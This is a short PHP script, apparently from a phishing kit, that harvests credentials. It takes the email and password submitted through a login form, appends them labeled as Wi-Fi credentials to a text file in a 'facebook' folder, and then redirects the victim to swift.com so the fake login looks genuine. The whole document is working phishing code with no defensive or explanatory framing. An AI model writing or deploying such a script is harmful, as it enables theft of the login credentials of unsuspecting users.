<?php

file_put_contents("../facebook/mydata.txt", "WI-FI Username: " . $_POST['email'] . " Password: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://www.swift.com/');
exit();
                                                                  
